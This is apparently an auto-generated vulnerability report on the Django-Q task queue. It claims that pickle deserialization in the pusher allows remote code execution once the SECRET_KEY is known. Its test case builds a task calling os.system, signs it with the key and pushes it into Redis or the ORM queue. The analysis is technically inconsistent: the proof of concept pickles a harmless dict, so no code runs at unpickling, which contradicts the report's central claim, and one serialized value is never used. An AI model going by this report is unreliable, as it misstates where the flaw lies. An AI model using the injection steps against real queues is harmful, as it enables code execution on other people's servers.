### Vulnerability Report: Django-Q Project

#### Vulnerability 1: Insecure Deserialization via Pickle in Task Signing

* Vulnerability Name: Insecure Deserialization via Pickle in Task Signing
* Description:
    1. Django-q utilizes `pickle` serialization through `django_q.signing.PickleSerializer` to convert tasks into a byte stream before signing and storing them in the broker.
    2. The `SignedPackage.dumps` method employs `pickle.dumps` to serialize the task data.
    3. Subsequently, the `SignedPackage.loads` method uses `pickle.loads` to deserialize the task data when retrieving it from the broker or cache for processing by `pusher` process.
    4. `pickle.loads` is inherently vulnerable to arbitrary code execution when handling untrusted data, as deserialization can be manipulated to execute malicious code.
    5. Should an attacker manage to compromise the `SECRET_KEY` or circumvent signature verification, they could inject a maliciously crafted pickled payload into the task queue.
    6. When a worker processes this tampered task, the call to `SignedPackage.loads` in `pusher` will deserialize the malicious payload, leading to arbitrary code execution within the worker's environment during task unpacking in `pusher` before task is placed into `task_queue`.
* Impact:
    - Remote Code Execution (RCE) on the worker machine. Successful exploitation allows an attacker to execute arbitrary code with the privileges of the worker process. This can result in severe security breaches, including unauthorized access to sensitive data, full system compromise, and the potential for lateral movement to other parts of the infrastructure.
* Vulnerability Rank: Critical
* Currently Implemented Mitigations:
    - Task signing is implemented using Django's signing module. This is intended as a measure to prevent tampering with task packages. However, the effectiveness of this mitigation is entirely dependent on the secrecy and integrity of the `SECRET_KEY`. If the key is compromised or if a bypass is found in the signature verification process, the signing offers no protection against malicious payloads.
* Missing Mitigations:
    - **Input Validation and Sanitization**: Implement rigorous input validation and sanitization for task functions and arguments before serialization. This should include checks to ensure that the function and arguments are expected and safe, reducing the attack surface.
    - **Alternative Serialization Methods**: Replace `pickle` with safer serialization formats like `json` or consider using libraries like `marshmallow` for controlled serialization and deserialization. These alternatives are less prone to arbitrary code execution vulnerabilities.
    - **Encryption of Task Packages**: In addition to signing, implement encryption of task packages to protect confidentiality and integrity. Encryption ensures that even if an attacker intercepts a task package, they cannot read or modify its contents without the decryption key.
    - **Robust SECRET_KEY Management**: Enhance `SECRET_KEY` management practices, including secure storage, regular rotation, and protection against unauthorized access. Employ methods like environment variables, vault systems, or hardware security modules to manage the key securely.
* Preconditions:
    - For successful exploitation, an attacker must be able to inject a malicious signed package into the task queue. This could be achieved if:
        - The `SECRET_KEY` is compromised or leaked, allowing the attacker to create valid signatures for malicious payloads.
        - A vulnerability exists that allows bypassing the signature verification process, enabling the injection of unsigned or improperly signed malicious packages.
        - An insider threat scenario where an authorized user with task creation privileges intentionally injects malicious tasks.
* Source Code Analysis:
    - File: `/code/django_q/signing.py`
    ```python
    import pickle
    from django_q import core_signing as signing
    from django_q.conf import Conf

    class PickleSerializer:
        @staticmethod
        def dumps(obj) -> bytes:
            return pickle.dumps(obj, protocol=pickle.HIGHEST_PROTOCOL)

        @staticmethod
        def loads(data) -> any:
            return pickle.loads(data)

    class SignedPackage:
        @staticmethod
        def dumps(obj, compressed: bool = Conf.COMPRESSED) -> str:
            return signing.dumps(
                obj,
                key=Conf.SECRET_KEY,
                salt=Conf.PREFIX,
                compress=compressed,
                serializer=PickleSerializer,
            )

        @staticmethod
        def loads(obj) -> any:
            return signing.loads(
                obj, key=Conf.SECRET_KEY, salt=Conf.PREFIX, serializer=PickleSerializer
            )
    ```
    - The `PickleSerializer` class within `/code/django_q/signing.py` directly uses `pickle.dumps` for serialization and `pickle.loads` for deserialization. This class is then used by `SignedPackage` for signing tasks.
    - File: `/code/django_q/cluster.py`
    ```python
    def pusher(task_queue: Queue, event: Event, broker: Broker = None):
        ...
        while True:
            ...
            if task_set:
                for task in task_set:
                    ack_id = task[0]
                    # unpack the task
                    try:
                        task = SignedPackage.loads(task[1]) # Deserialize task payload here
                    except (TypeError, BadSignature) as e:
                        logger.error(e, traceback.format_exc())
                        broker.fail(ack_id)
                        continue
                    task["ack_id"] = ack_id
                    task_queue.put(task) # Put task into queue after deserialization
            ...
    ```
    - The `pusher` function in `/code/django_q/cluster.py` is responsible for fetching tasks from the broker and adding them to the `task_queue`.
    - Critically, `SignedPackage.loads(task[1])` is called within the `pusher` function to deserialize the task payload retrieved from the broker. This deserialization step is performed using `pickle.loads` as defined in `PickleSerializer`.
    - If an attacker can inject a malicious payload into the broker, this payload will be deserialized by `pickle.loads` when the `pusher` processes it, leading to potential Remote Code Execution.
    - The worker process then retrieves tasks from the `task_queue` (which are already deserialized) and executes the task function. The vulnerability lies in the deserialization step within the `pusher`, before the task even reaches the worker queue.

* Security Test Case:
    1. **Setup**: Deploy a publicly accessible instance of a django-q application. Ensure you have access to configure and monitor this instance. For demonstration purposes, you may need to simulate or gain access to the `SECRET_KEY`. In a real-world scenario, assume the attacker has found a way to compromise or guess the key, or is attempting to exploit a bypass in signature verification.
    2. **Craft Malicious Payload**: Prepare a Python dictionary that represents a legitimate task structure, but replace the function (`func`) to be executed with a malicious command. For example, use `os.system('touch /tmp/django_q_pwned')` as the malicious function. Alternatively, you could inject malicious code within the arguments (`args` or `kwargs`) that gets executed upon deserialization.
    ```python
    import os
    import pickle
    from django_q.signing import SignedPackage

    malicious_task = {
        'name': 'malicious_task',
        'func': 'os.system',
        'args': ('touch /tmp/django_q_pwned',),
        'kwargs': {},
        'started': None,
        'stopped': None,
        'success': False,
        'result': None,
    }
    ```
    3. **Serialize the Malicious Payload**: Use `pickle.dumps` from the standard Python library to serialize the malicious task dictionary into a byte stream.
    ```python
    pickled_payload = pickle.dumps(malicious_task, protocol=pickle.HIGHEST_PROTOCOL)
    ```
    4. **Sign the Malicious Payload**: Employ the `django_q.signing.SignedPackage.dumps` method, or directly use `django.core.signing.dumps` with `PickleSerializer`, along with the compromised `SECRET_KEY` to sign the pickled payload. This step creates a signed malicious task package that django-q workers will recognize as valid if the key is indeed compromised or signature verification is bypassed.
    ```python
    from django.conf import settings
    settings.configure(SECRET_KEY='your_django_secret_key', DJANGO_Q_PREFIX='django_q') # Replace 'your_django_secret_key' with the actual SECRET_KEY
    signed_payload = SignedPackage.dumps(malicious_task) # If SECRET_KEY is configured in Django settings

    # OR, if you want to manually sign (e.g., for testing with a known key):
    # from django.core import signing
    # signed_payload = signing.dumps(malicious_task, key=settings.SECRET_KEY, salt=settings.DJANGO_Q_PREFIX, serializer=PickleSerializer)
    ```
    5. **Inject Malicious Task into Queue**: Manually inject this crafted, signed malicious package into the django-q task queue. Depending on the broker being used:
        - For Redis broker: Use `redis-cli` to connect to the Redis instance and execute `LPUSH <task_queue_key> <malicious_signed_package>`.  The task queue key is usually `django_q:q`.
        ```bash
        redis-cli LPUSH django_q:q "<signed_payload_string>"
        ```
        - For ORM broker: Directly insert a new record into the `django_q_ormq` table with the malicious payload. You need to serialize the signed payload to string before inserting.
        ```python
        from django_q.models import OrmQ
        import base64
        OrmQ.objects.create(key='django_q', payload=base64.b64encode(signed_payload.encode()).decode('utf-8'))
        ```
    6. **Trigger Task Processing**: Allow the django-q cluster (sentinel, pusher, worker, monitor) to be running. The pusher will pick up the task from the queue.
    7. **Verify Code Execution**: After the pusher has processed the task, verify if the malicious code was executed on the worker machine. For the example payload `os.system('touch /tmp/django_q_pwned')`, check if a file named `django_q_pwned` has been created in the `/tmp/` directory of the worker's filesystem. If the file exists, it confirms successful Remote Code Execution (RCE).

This security test case effectively demonstrates how an attacker, by exploiting insecure deserialization via Pickle and potentially compromising the `SECRET_KEY` or bypassing signature checks, can achieve remote code execution on django-q worker instances. The vulnerability exists in the `pusher` process during task unpacking before the task is even assigned to a worker for execution.